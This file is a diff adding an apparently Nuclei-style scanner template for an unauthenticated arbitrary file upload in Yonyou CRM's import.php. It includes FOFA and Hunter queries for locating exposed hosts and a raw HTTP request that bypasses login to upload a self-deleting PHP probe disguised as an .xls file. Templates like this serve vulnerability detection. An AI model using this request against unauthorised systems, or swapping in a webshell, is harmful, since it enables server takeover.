@@ -1,0 +1,51 @@
+id: yonyou-crm-import-file-upload
+
+info:
+  name: Yonyou CRM import.php Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: |
+    用友CRM客户关系管理系统的import.php存在任意文件上传漏洞，未经身份验证的攻击者可以通过该漏洞上传webshell文件，从而获取到服务器权限。
+  metadata:
+    fofa-query: 'body="用友U8CRM"'
+    hunter-query: 'app.name="用友 CRM"'
+  tags: yonyou, crm, file-upload
+
+variables:
+  filename: "{{rand_base(6)}}.php"
+  num1: "{{rand_int(10000, 20000)}}"
+  num2: "{{rand_int(10000, 20000)}}"
+  result: "{{to_number(num1)*to_number(num2)}}"
+  boundary: "{{rand_base(20)}}"
+
+http:
+  - raw:
+    - |
+      POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary={{boundary}}
+
+      --{{boundary}}
+      Content-Disposition: form-data; name="xfile"; filename="11.xls"
+
+      <?php print({{num1}}*{{num2}});unlink(__FILE__);?>
+      --{{boundary}}
+      Content-Disposition: form-data; name="combo"
+
+      {{filename}}
+      --{{boundary}}--
+
+    - |
+      GET /tmpfile/{{filename}} HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{result}}'
+
+      - type: status
+        status:
+          - 200
